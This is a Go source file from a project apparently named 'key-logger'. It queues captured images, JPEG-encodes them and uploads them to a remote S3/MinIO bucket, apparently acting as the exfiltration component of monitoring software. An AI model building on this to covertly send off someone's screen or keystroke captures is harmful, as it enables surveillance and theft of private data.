package s3

import (
	"bytes"
	"context"
	"fmt"
	"image/jpeg"
	"log"
	"time"

	"github.com/minio/minio-go/v7"
	"github.com/minio/minio-go/v7/pkg/credentials"

	"key-logger/pkg/model"
)

var (
	EightyFivePercent = jpeg.Options{Quality: 85}
)

type S3 struct {
	sendChan   chan *model.Image
	client     *minio.Client
	endpoint   string
	bucketName string
}

func New(endpoint, accessKeyID, secretAccessKey, bucketName string) *S3 {
	// Initialize minio client object.
	minioClient, err := minio.New(endpoint, &minio.Options{
		Creds:  credentials.NewStaticV4(accessKeyID, secretAccessKey, ""),
		Secure: true,
	})
	if err != nil {
		log.Fatalln(err)
	}

	s3 := &S3{
		sendChan:   make(chan *model.Image, 10),
		client:     minioClient,
		endpoint:   endpoint,
		bucketName: bucketName,
	}
	go s3.run()
	return s3
}

func (s *S3) run() {
	for image := range s.sendChan {
		im := image.Image
		//file, err := os.Create(fileName)
		//if err != nil {
		//	panic(err)
		//}
		//defer file.Close()
		buf := &bytes.Buffer{}
		err := jpeg.Encode(buf, im, nil)
		if err != nil {
			fmt.Println("failed to create jpeg", err)
			continue
		}
		ctx := context.Background()
		ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
		defer cancel()
		_, err = s.client.PutObject(ctx, s.bucketName, image.Location, buf, int64(buf.Len()), minio.PutObjectOptions{ContentType: "image/jpeg"})
		if err != nil {
			fmt.Println("failed to upload image", err)
		}
	}
}

func (s *S3) Send(image *model.Image) {
	select {
	case s.sendChan <- image:
	default:
		fmt.Println("image send queue is full! not sending message.")
	}

}

func (s *S3) GetBucket() string {
	return s.bucketName
}

func (s *S3) GetEndpoint() string {
	return s.endpoint
}
